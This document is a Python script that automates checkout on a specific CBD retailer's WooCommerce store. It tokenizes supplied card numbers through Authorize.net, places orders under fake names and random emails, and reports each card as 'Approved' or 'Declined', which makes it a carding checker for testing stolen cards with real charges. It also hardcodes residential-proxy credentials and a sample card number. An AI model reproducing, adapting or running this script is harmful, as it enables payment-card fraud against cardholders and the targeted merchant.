import random
import re
import uuid
from bs4 import BeautifulSoup
import names
import requests

class ConfigsPAge:
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            
            except: 
                return 'value not found' 
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    @classmethod
    def RandomName(self,dato:str=None):
        
        if dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'
    
    
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

proxy_url = 'http://97758037913464da:RNW78Fm5@res.proxy-seller.com:10000'


class Cool:
    def main(self,card):
       # try:
            self.ccs = card.split('|')
            self.UseMail = ConfigsPAge().RandomName('email')
            if self.ccs[0].startswith("4"): self.brand = "VISA"
            if self.ccs[0].startswith("3"): self.brand = "AMEX"
            if self.ccs[0].startswith("6"): self.brand = "DISCOVER"
            elif self.ccs[0].startswith("5"): self.brand = "MASTER_CARD"
            self.session = requests.Session()
   
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.hellobluecbd.com/shop-all-products/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://www.hellobluecbd.com/cbd-oil-store/super-secret-chamois-creme/', headers=headers,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryHoAk3ImFFZOR3OgB','origin': 'https://www.hellobluecbd.com','priority': 'u=0, i','referer': 'https://www.hellobluecbd.com/cbd-oil-store/super-secret-chamois-creme/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = f'------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="attribute_pa_jar-size"\r\n\r\n4oz-113g\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="subscribe-to-action-input"\r\n\r\nno\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="convert_to_sub_dropdown234"\r\n\r\n1_month\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="convert_to_sub_234"\r\n\r\n0\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n234\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="product_id"\r\n\r\n234\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB\r\nContent-Disposition: form-data; name="variation_id"\r\n\r\n244\r\n------WebKitFormBoundaryHoAk3ImFFZOR3OgB--\r\n'
            response = self.session.post('https://www.hellobluecbd.com/cbd-oil-store/super-secret-chamois-creme/',headers=headers, data=data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.hellobluecbd.com/cbd-oil-store/super-secret-chamois-creme/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://www.hellobluecbd.com/checkout-23/', headers=headers)

            
            Checkout = ConfigsPAge().QueryText(r1.text,'name="woocommerce-process-checkout-nonce" value="','"')
            nonce_client = ConfigsPAge().QueryText(r1.text, 'clientKey="','"')
            nonce_login_id = ConfigsPAge().QueryText(r1.text, '"login_id":"','"')
            id_session = ConfigsPAge().SessionId()

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.hellobluecbd.com','priority': 'u=1, i','referer': 'https://www.hellobluecbd.com/checkout-23/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'billing_first_name': 'saddada','billing_last_name': 'fsafafasf','billing_company': '','billing_country': 'US','billing_address_1': 'Times Square, Nueva York, EE. UU.','billing_address_2': '','billing_city': 'Manhattan','billing_state': 'NY','billing_postcode': '10036','billing_phone': '6466308864','billing_email': self.UseMail,'order_comments': '','action': 'wpms_checkout_errors','_ajax_nonce': 'b3a301f136',}
            response = self.session.post('https://www.hellobluecbd.com/wp-admin/admin-ajax.php', headers=headers, data=data)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.hellobluecbd.com','priority': 'u=1, i','referer': 'https://www.hellobluecbd.com/checkout-23/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'shipping_method0': 'wf_easypost_id:GroundAdvantage','action': 'wpms_checkout_errors','_ajax_nonce': 'b3a301f136',}
            response = self.session.post('https://www.hellobluecbd.com/wp-admin/admin-ajax.php', headers=headers, data=data)

            headers = {'Accept': '*/*','Accept-Language': 'es-419,es;q=0.9','Access-Control-Request-Headers': 'content-type','Access-Control-Request-Method': 'POST','Connection': 'keep-alive','Origin': 'https://www.hellobluecbd.com','Referer': 'https://www.hellobluecbd.com/','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.options('https://api2.authorize.net/xml/v1/request.api', headers=headers)

            headers = {'Accept': '*/*','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json; charset=UTF-8','Origin': 'https://www.hellobluecbd.com','Referer': 'https://www.hellobluecbd.com/','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'securePaymentContainerRequest': {'merchantAuthentication': {'name': nonce_login_id,'clientKey': nonce_client,},'data': {'type': 'TOKEN','id': id_session,'token': {'cardNumber': self.ccs[0],'expirationDate': f'{self.ccs[1]}{self.ccs[2]}','cardCode': self.ccs[3],'zip': '10036','fullName': 'saddada fsafafasf',},},},}
            r2 = self.session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
            dataValue = ConfigsPAge().QueryText(r2.text,'"dataValue":"','"')

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.hellobluecbd.com','priority': 'u=1, i','referer': 'https://www.hellobluecbd.com/checkout-23/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'wc-ajax': 'checkout',}
            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.hellobluecbd.com%2F&wc_order_attribution_session_start_time=2025-04-08+22%3A12%3A06&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F134.0.0.0+Safari%2F537.36&billing_first_name=saddada&billing_last_name=fsafafasf&billing_company=&billing_country=US&billing_address_1=Times+Square%2C+Nueva+York%2C+EE.+UU.&billing_address_2=&billing_city=Manhattan&billing_state=NY&billing_postcode=10036&billing_phone=6466308864&billing_email={self.UseMail}&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wf_easypost_id%3APriority&wc-points-rewards-max-points=0&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry={self.ccs[1]}+%2F+{self.ccs[2]}&wc-authorize-net-cim-credit-card-payment-nonce={dataValue}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four={self.ccs[-4:]}&wc-authorize-net-cim-credit-card-card-type=visa&terms=on&terms-field=1&woocommerce-process-checkout-nonce={Checkout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
            Salchichon = self.session.post('https://www.hellobluecbd.com/', params=params, headers=headers, data=data)

            ConfigsPAge().SaveResponseHhml(response.text)
                
            if 'succes' in Salchichon.text:
                return 'Approved! ✅','Charged $23.64'

            elif 'The card verification number does not match. Please re-enter and try again.' in Salchichon.text:
                return 'Approved! ✅', 'Card verification number does not match.'

            elif 'The provided address does not match the billing address for cardholder.' in Salchichon.text:
                return 'Approved! ✅','Charged $23.64'

            else:

                mesasage = Salchichon.json()['messages'] 
                ress = BeautifulSoup(mesasage, 'html.parser')
                error_message = ress.find('ul', class_='woocommerce-error').find('li').text.strip()
                return 'Declined! ❌',error_message
       
      #  except: return 'Declined! ❌','The provided card was declined.'
                

print(Cool().main('4800126405060713|03|2029|326'))